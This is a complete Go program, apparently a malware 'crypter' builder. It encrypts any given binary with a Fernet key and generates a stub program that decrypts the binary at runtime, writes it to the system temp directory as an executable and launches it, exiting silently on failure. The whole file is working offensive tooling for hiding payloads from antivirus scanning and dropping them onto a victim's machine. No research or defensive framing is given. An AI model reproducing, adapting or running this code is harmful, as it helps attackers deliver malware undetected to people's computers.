package main

import (
        "fmt"
        "github.com/fernet/fernet-go"
        "io/ioutil"
        "log"
        "os"
        "path/filepath"
        "text/template"
)

// GenerateRandomKey generates a new Fernet key
func GenerateRandomKey() (*fernet.Key, error) {
        var key fernet.Key
        err := key.Generate()
        if err != nil {
                return nil, err
        }
        return &key, nil
}

// Encrypt the payload using the provided key
func encrypt(payload []byte, key *fernet.Key) (string, error) {
        token, err := fernet.EncryptAndSign(payload, key)
        if err != nil {
                return "", err
        }
        return string(token), nil
}

// Create a new payload file with the encrypted token
func createPayload(token string, key *fernet.Key, outputName string) error {
        payloadTemplate := `
package main

import (
        "github.com/fernet/fernet-go"
        "io/ioutil"
        "os"
        "os/exec"
    "runtime"
)

func main() {
        token := "{{.Token}}"
        key := "{{.Key}}"

        decodedKey, err := fernet.DecodeKey(key)
        if err != nil {
                os.Exit(1)
        }

        payload := fernet.VerifyAndDecrypt([]byte(token), 0, []*fernet.Key{decodedKey})
        if payload == nil {
                os.Exit(1) // Exit if decryption failed
        }

    // If the os is windows, save the payload to C:/Windows/Temp
    if runtime.GOOS == "windows" {
        err = ioutil.WriteFile("C:/Windows/Temp/{{.OutputName}}", payload, 0755)
        if err != nil {
            os.Exit(1)
        }
    } else {
        err = ioutil.WriteFile("/tmp/{{.OutputName}}", payload, 0755)
        if err != nil {
            os.Exit(1)
        }
    }
        // Execute the decrypted payload

    if runtime.GOOS == "windows" {
        cmd := exec.Command("C:/Windows/Temp/{{.OutputName}}")
        if err := cmd.Start(); err != nil {
            os.Exit(1)
        }
    } else {
        cmd := exec.Command("/tmp/{{.OutputName}}")
        if err := cmd.Start(); err != nil {
            os.Exit(1)
        }
    }
}
`

        t, err := template.New("payload").Parse(payloadTemplate)
        if err != nil {
                return err
        }

        output := struct {
                Token      string
                Key        string
                OutputName string
        }{
                Token:      token,
                Key:        key.Encode(),
                OutputName: outputName,
        }

        file, err := os.Create("new_payload.go")
        if err != nil {
                return err
        }
        defer file.Close()

        if err := t.Execute(file, output); err != nil {
                return err
        }

        return nil
}

func main() {
        if len(os.Args) < 2 {
                log.Fatal("Usage: encryptor <path_to_payload>")
        }

        payloadPath := os.Args[1]
        payload, err := ioutil.ReadFile(payloadPath)
        if err != nil {
                log.Fatal(err)
        }

        key, err := GenerateRandomKey()
        if err != nil {
                log.Fatal(err)
        }

        token, err := encrypt(payload, key)
        if err != nil {
                log.Fatal(err)
        }

        outputName := filepath.Base(payloadPath)

        if err := createPayload(token, key, outputName); err != nil {
                log.Fatal(err)
        }

        fmt.Println("New payload created: new_payload.go")
}
